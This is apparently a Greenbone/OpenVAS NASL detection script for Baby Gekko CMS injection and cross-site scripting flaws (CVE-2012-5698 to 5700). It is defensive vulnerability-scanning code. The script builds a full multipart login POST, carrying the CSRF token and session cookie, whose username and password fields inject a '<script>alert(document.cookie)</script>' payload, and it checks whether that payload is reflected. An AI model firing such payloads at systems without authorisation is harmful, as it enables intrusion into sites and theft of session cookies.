if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804856" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2012-5698", "CVE-2012-5699", "CVE-2012-5700" );
	script_bugtraq_id( 56523, 56523, 56523 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-09-24 14:10:24 +0530 (Wed, 24 Sep 2014)" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_name( "Baby Gekko CMS Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is running Baby Gekko CMS and is
  prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET
  request and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple errors exist due to:

  - Insufficient validation of input passed via the 'keyword', 'query' and 'id'
    parameters to /admin/index.php script.

  - Insufficient validation of input passed via the 'app' parameter to index.php
    script.

  - Insufficient validation of input passed via the 'username' and 'password'
    HTTP POST parameters to the index.php script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database and
  execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "Baby Gekko CMS before version 1.2.2f" );
	script_tag( name: "solution", value: "Upgrade to 1.2.2f, 1.2.4, or later." );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22741" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23122" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/118104" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.schlix.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/gekkocms", "/babygekko", "/cms", "/gekko", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/admin/index.php" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(rcvRes && ContainsString( rcvRes, "Gekko CMS Administration<" )){
		sndReq = http_get( item: NASLString( dir, "/users/action/login" ), port: http_port );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		cookie = eregmatch( pattern: "Set-Cookie: ([0-9a-z]+=[0-9a-z]+);", string: rcvRes );
		if(!cookie[1]){
			exit( 0 );
		}
		csrftoken = eregmatch( pattern: "csrftoken\" type=\"hidden\" value=\"([0-9a-z]*)\"", string: rcvRes );
		if(!csrftoken[1]){
			exit( 0 );
		}
		postData = NASLString( "-----------------------------769391821827878191354119224\\r\\n", "Content-Disposition: form-data; name=\"login\"\r\n", "\r\n login\r\n", "-----------------------------769391821827878191354119224\r\n", "Content-Disposition: form-data; name=\"_csrftoken\"\r\n", "\r\n ", csrftoken[1], "\r\n", "-----------------------------769391821827878191354119224\r\n", "Content-Disposition: form-data; name=\"username\"\r\n\r\n", "\"><script>alert(document.cookie);</script>\r\n", "-----------------------------769391821827878191354119224\r\n", "Content-Disposition: form-data; name=\"password\"\r\n\r\n", "\"><script>alert(document.cookie);</script>\r\n", "-----------------------------769391821827878191354119224\r\n", "Content-Disposition: form-data; name=\"submit\"\r\n\r\n", "Submit\r\n", "-----------------------------769391821827878191354119224--\r\n" );
		url = dir + "/users/action/login";
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: PHPSESSID=40c5tp269mdbo4a0au68ebsjc0;", cookie[1], "\\r\\n", "Content-Type: multipart/form-data;boundary=---------------------------769391821827878191354119224\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", "\\r\\n", postData, "\\r\\n" );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie);</script>" ) && ContainsString( rcvRes, ">Login<" ) && ContainsString( rcvRes, ">Baby Gekko" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

